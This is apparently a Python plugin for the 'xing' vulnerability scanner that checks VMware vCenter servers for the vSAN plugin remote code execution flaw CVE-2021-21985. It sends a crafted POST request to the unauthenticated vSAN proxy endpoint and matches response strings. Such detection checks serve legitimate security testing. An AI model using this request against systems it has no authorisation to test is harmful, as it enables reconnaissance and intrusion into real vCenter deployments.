from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


'''
参考：
https://github.com/mauricelambert/CVE-2021-21985/blob/1645a814da2bdca170f5a450fb50240fa21bfc3b/CVE_2021_21985.py
'''

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Vmware vCenter vsan 插件 RCE(CVE-2021-21985)"
        self.app_name = 'vCenter'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        check_path = "/ui/"

        url = target + check_path

        conn = http_req(url)

        if b'Client</title>' not in conn.content:
            self.logger.debug("not found  vCenter {} ".format(url))
            return False

        url = target + "/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData"
        json_data = {
            "methodInput": [
                {"type": "ClusterComputeResource", "value": None, "serverGuid": None}
            ]
        }
        conn = http_req(url, method='post', json=json_data)

        check1 = b"com.vmware.vsan.client.services.capability.VsanCapabilityProvider cannot be found by com.vmware"
        check2 = b',"isDeduplicationAndCompressionSupported":'

        if check1 in conn.content or check2 in conn.content:
            self.logger.debug("found  vCenter Rce {} ".format(url))
            return True


